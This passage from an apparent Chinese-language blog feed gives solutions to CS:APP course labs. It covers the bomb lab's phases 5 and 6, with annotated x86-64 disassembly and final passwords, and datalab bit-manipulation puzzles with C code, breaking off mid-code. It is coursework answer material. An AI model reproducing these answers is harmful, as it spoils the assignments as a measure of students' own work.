alt="image-20210317085132914"></p><p>然后在上一个字符串中查看后一个字符串对应的下标，很容易得到下标分别为：9  15  14  5  6  7</p><p>这六个数低四位的16进制为：0x9  0xf  0xe 0x5 0x6  0x7</p><p>查看ASSCI表可知9?n567或  9?&gt;567都可以。</p><p>所以密码可以为9?n567或  9?&gt;567等等，答案不唯一</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317090128611.png" alt="image-20210317090128611"></p></li></ul><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase_6"></a>6. phase_6</h2><ul><li><p>汇编代码和指令思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004010f4 &lt;phase_6&gt;:<br>  4010f4:41 56                push   %r14<br>  4010f6:41 55                push   %r13<br>  4010f8:41 54                push   %r12<br>  4010fa:55                   push   %rbp<br>  4010fb:53                   push   %rbx<br>  4010fc:48 83 ec 50          sub    $0x50,%rsp<br>  401100:49 89 e5             mov    %rsp,%r13<br>  401103:48 89 e6             mov    %rsp,%rsi<br>  401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;*读取六个数字<br>  40110b:49 89 e6             mov    %rsp,%r14<br>  40110e:41 bc 00 00 00 00    mov    $0x0,%r12d<br>  401114:4c 89 ed             mov    %r13,%rbp<br>  401117:41 8b 45 00          mov    0x0(%r13),%eax<br>  40111b:83 e8 01             sub    $0x1,%eax<br>  40111e:83 f8 05             cmp    $0x5,%eax<br>  401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;*第一个循环，判断a[0]&lt;=6,是继续，否则爆炸<br>  401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401128:41 83 c4 01          add    $0x1,%r12d*%r12d为第一个循环计数器<br>  40112c:41 83 fc 06          cmp    $0x6,%r12d<br>  401130:74 21                je     401153 &lt;phase_6+0x5f&gt;*终止条件，六次后结束<br>  401132:44 89 e3             mov    %r12d,%ebx<br>  401135:48 63 c3             movslq %ebx,%rax<br>  401138:8b 04 84             mov    (%rsp,%rax,4),%eax<br>  40113b:39 45 00             cmp    %eax,0x0(%rbp)<br>  40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;*第二个循环，a[i++],依次和a[0]比较，相同则爆炸<br>  401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401145:83 c3 01             add    $0x1,%ebx*%ebx为第二个循环计数器，计数5次<br>  401148:83 fb 05             cmp    $0x5,%ebx<br>  40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;<br>  40114d:49 83 c5 04          add    $0x4,%r13*结合这行，第一个循环就是判断每个数都小于等于6<br>  401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;<br>  401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi<br>  401158:4c 89 f0             mov    %r14,%rax<br>  40115b:b9 07 00 00 00       mov    $0x7,%ecx<br>  401160:89 ca                mov    %ecx,%edx<br>  401162:2b 10                sub    (%rax),%edx<br>  401164:89 10                mov    %edx,(%rax)<br>  401166:48 83 c0 04          add    $0x4,%rax<br>  40116a:48 39 f0             cmp    %rsi,%rax<br>  40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;*第三层循环之后，a[i]=7-a[i] <br>  40116f:be 00 00 00 00       mov    $0x0,%esi<br>  401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;<br>  401176:48 8b 52 08          mov    0x8(%rdx),%rdx<br>  40117a:83 c0 01             add    $0x1,%eax<br>  40117d:39 c8                cmp    %ecx,%eax<br>  40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;<br>  401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;<br>  401183:ba d0 32 60 00       mov    $0x6032d0,%edx<br>  401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)<br>  40118d:48 83 c6 04          add    $0x4,%rsi<br>  401191:48 83 fe 18          cmp    $0x18,%rsi<br>  401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;<br>  401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx<br>  40119a:83 f9 01             cmp    $0x1,%ecx<br>  40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;<br>  40119f:b8 01 00 00 00       mov    $0x1,%eax<br>  4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx*存放链表结点数值的起始地址<br>  4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;<br>  4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>  4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax<br>  4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi<br>  4011ba:48 89 d9             mov    %rbx,%rcx<br>  4011bd:48 8b 10             mov    (%rax),%rdx<br>  4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)<br>  4011c4:48 83 c0 08          add    $0x8,%rax<br>  4011c8:48 39 f0             cmp    %rsi,%rax<br>  4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;<br>  4011cd:48 89 d1             mov    %rdx,%rcx<br>  4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;*确定链表数字为降序排序<br>  4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)<br>  4011d9:00 <br>  4011da:bd 05 00 00 00       mov    $0x5,%ebp<br>  4011df:48 8b 43 08          mov    0x8(%rbx),%rax<br>  4011e3:8b 00                mov    (%rax),%eax<br>  4011e5:39 03                cmp    %eax,(%rbx)<br>  4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;<br>  4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>  4011f2:83 ed 01             sub    $0x1,%ebp<br>  4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;<br>  4011f7:48 83 c4 50          add    $0x50,%rsp<br>  4011fb:5b                   pop    %rbx<br>  4011fc:5d                   pop    %rbp<br>  4011fd:41 5c                pop    %r12<br>  4011ff:41 5d                pop    %r13<br>  401201:41 5e                pop    %r14<br>  401203:c3                   retq  <br></code></pre></td></tr></table></figure></li><li><p><strong>解决思路：</strong></p><p>上述代码思路概括就是将链表结点数值按照降序排序，其对应的数值即为顺序，最后a[i]=7-a[i]，即为我们要输入的值。</p><p>首先我们用gdb指令查看链表的数据：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317104905959.png" alt="image-20210317104905959"></p><p>这六个数字按照降序排列对应的编码顺序为：3  4  5  6  1  2</p><p>运算后即为：4 3 2 1 6 5</p><p>故密码为：4 3 2 1 6 5</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317105113068.png" alt="image-20210317105113068"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab2_datalab</title>
    <link href="/2021/07/04/lab2_datalab/"/>
    <url>/2021/07/04/lab2_datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="lab2-datalab"><a href="#lab2-datalab" class="headerlink" title="lab2_datalab"></a>lab2_datalab</h1><h2 id="1-bitAnd"><a href="#1-bitAnd" class="headerlink" title="1.bitAnd"></a>1.bitAnd</h2><p>这个很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitAnd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~x|~y);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-getByte"><a href="#2-getByte" class="headerlink" title="2.getByte"></a>2.getByte</h2><p>舍掉最后的n个字节，即n*8位，并保留舍掉后的最后8位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 6</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getByte</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> tmp =x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>);<span class="hljs-comment">//将目标移到最后</span><br>   tmp=tmp&amp;<span class="hljs-number">0xFF</span>;<span class="hljs-comment">//保留目标</span><br>   <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="3-logicalShift"><a href="#3-logicalShift" class="headerlink" title="3.logicalShift"></a>3.logicalShift</h2><p>对x进行逻辑右移（算术右移补符号位，逻辑右移补0），可以采用先进行算术右移，然后将右移多出来的符号位置0。</p><p>因为不能使用减号，所以将1左移31位后采用先右移n,再左移1位的方法，最后取反。</p><p>与算术右移进行与即可得到结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalShift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> result = (x &gt;&gt; n) &amp; (~(((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &gt;&gt; n) &lt;&lt; <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-bitCount"><a href="#4-bitCount" class="headerlink" title="4.bitCount"></a>4.bitCount</h2><p>此问题较为复杂，参考了网上的做法，采用自底向上的方式进行求解，先求两位中1的个数、再求四位中1的个数……最后求三十二位中1的个数</p><p>具体过程如图所示:</p><p><img src="/2021/07/04/lab2_datalab/image-20210406160622289.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> mask_1,mask_2,mask_4,mask_8,mask_16;<br><br>  mask_1=<span class="hljs-number">0x55</span>|(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_1=mask_1|(mask_1&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x55555555,即01010101···</span><br>  mask_2=<span class="hljs-number">0x33</span>|(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_2=mask_2|(mask_2&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x33333333,即00110011···</span><br>  mask_4=<span class="hljs-number">0x0f</span>|(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_4=mask_4|(mask_4&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x0f0f0f0f,即00001111···</span><br>  mask_8=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//0000000011111111 0000000011111111</span><br>  mask_16=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<span class="hljs-comment">//00000000000000001111111111111111</span><br>  x=(x&amp;mask_1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask_1);<br>  x=(x&amp;mask_2)+((x&gt;&gt;<span class="hljs-number">2</span>)&amp;mask_2);<br>  <span class="hljs-comment">//下面三组最高位不会是1了 </span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">4</span>))&amp;mask_4;<span class="hljs-comment">//x=(x&amp;mask_4)+((x&gt;&gt;4)&amp;mask_4);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">8</span>))&amp;mask_8;<span class="hljs-comment">//x=(x&amp;mask_8)+((x&gt;&gt;8)&amp;mask_8);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">16</span>))&amp;mask_16;<span class="hljs-comment">//x=(x&amp;mask_16)+((x&gt;&gt;16)&amp;mask_16);</span><br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-bang"><a href="#5-bang" class="headerlink" title="5.bang"></a>5.bang</h2><p>不利用逻辑符号!求一个数的逻辑非，也就是判断该数的二进制位<strong>是否全为0</strong>，若全为0则返回1，否则返回0。</p><p>一个<strong>求补码</strong>的方法：<strong>从最低位到第一个1之间不变，其他位按位取反</strong>。</p><p>一个数与其补码相或后，只有0x00000000的结果最高位是0，其他数结果都是1，所以我们将原数与其补码相或后右移31位得到最高位，将最高位与1相与，结果为0说明原数是0，取反后输出1，否则说明原数不为0，取反后输出0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> ~((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-tmin"><a href="#6-tmin" class="headerlink" title="6.tmin"></a>6.tmin</h2><p>返回 最小的二进制补码，为0x 8000 0000，直接左移31位即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-fitsBits"><a href="#7-fitsBits" class="headerlink" title="7.fitsBits"></a>7.fitsBits</h2><p>判断一个数能否表示成n位的二进制，能则返回1，不能返回0</p><p>关键在于这个n位是包括符号位的，即对于一个整数，其最高位应为0，对于一个负数，最高位为1</p><p>先左移32-n 再右移32-n,考虑符号位，若与x相等则说明可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> * n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> * 1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> * Max ops: 15</span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fitsBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> shiftNumber= <span class="hljs-number">32</span> + (~n + <span class="hljs-number">1</span>);<span class="hljs-comment">// 32 - n</span><br>   <span class="hljs-keyword">return</span> !(x^((x&lt;&lt;shiftNumber)&gt;&gt;shiftNumber));<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="8-divpwr2"><a href="#8-divpwr2" class="headerlink" title="8.divpwr2"></a>8.divpwr2</h2><p>将一个数除以2的n次方</p><p>除法是向下取整，正数位运算和除法运算相同，负数除法向0取整，位运算向下取整，<br> 所以要靠位运算来实现负数除法就要加一个偏置量，使其变成比原来的数小2^n个单位的数<br> 使得新数通过位运算的向下取整和原数的向0取整结果相同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divpwr2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx=x&gt;&gt;<span class="hljs-number">31</span>;<br><span class="hljs-keyword">int</span> mask =(<span class="hljs-number">1</span>&lt;&lt;n)+(~<span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> bias=signx&amp;mask;<br>    <span class="hljs-keyword">return</span> (bias+x)&gt;&gt;n;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-negate"><a href="#9-negate" class="headerlink" title="9.negate"></a>9.negate</h2><p>返回-x，很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-isPositive"><a href="#10-isPositive" class="headerlink" title="10.isPositive"></a>10.isPositive</h2><p>正数符号位为0，负数符号位为，0的符号位也是0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(x&gt;&gt;<span class="hljs-number">31</span>|!x);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-isLessOrEqual"><a href="#11-isLessOrEqual" class="headerlink" title="11.isLessOrEqual"></a>11.isLessOrEqual</h2><p>这道题相当于枚举 x&lt;=y 的所有情况：<br> 1.x为负数，y 为正数<br> 2.x 等于 y<br> 3.x 和 y 符号相同，并且 y-x 为正数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> signy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> tmp = signx ^ signy;<br><span class="hljs-keyword">int</span> tmp1 = tmp &amp; signx;<span class="hljs-comment">//为1时表示x为负数，y为正数</span><br><span class="hljs-keyword">int</span> y_x=y+(~x+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> tmp1|(!(x^y))|(!tmp&amp;!(y_x&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12-ilog2"><a href="#12-ilog2" class="headerlink" title="12.ilog2"></a>12.ilog2</h2><p>求一个数是2的几次幂，即求最高位的1的索引（0-31）</p><p>也是二分，先去掉后16位，先判断左边16位，若全是0，则!!(x&gt;&gt;16)返回0，否则返回1,1&lt;&lt;4则记录左边16位的最低位索引</p><p>若前16位中含1，则只保留了前16位，否则前16的0可以忽略，相当于考虑后16位</p><p>之后同理，将16位二分，然后记录索引。</p><p>全部索引相加就是结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 